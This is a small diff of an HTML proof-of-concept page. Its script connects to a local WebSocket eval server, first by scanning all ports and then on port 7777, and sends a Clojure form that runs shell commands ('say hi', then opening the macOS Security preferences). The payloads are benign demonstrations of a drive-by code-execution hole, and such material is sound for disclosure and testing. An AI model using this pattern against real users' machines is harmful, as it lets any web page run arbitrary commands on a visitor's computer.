@@ -1,10 +1,8 @@
 <html><head></head><body><script>
-  for(var i = 0; i<=65535; i++){
-    try {
-    var socket = new WebSocket('ws://localhost:' + i);
+  var port = 7777;
+  var socket = new WebSocket('ws://localhost:' + port);
     socket.addEventListener('open', event => {
   console.log('Connected to WebSocket server');
-  socket.send("{:type :eval :form (clojure.java.shell/sh \"say\" \"hi\")}");
-});
-    } catch (e) {}
-  };</script></body></html>
+  socket.send("{:type :eval :form (clojure.java.shell/sh \"open\" \"-b\" \"com.apple.systempreferences\" \"/System/Library/PreferencePanes/Security.prefPane\")}");
+    });
+   </script></body></html>
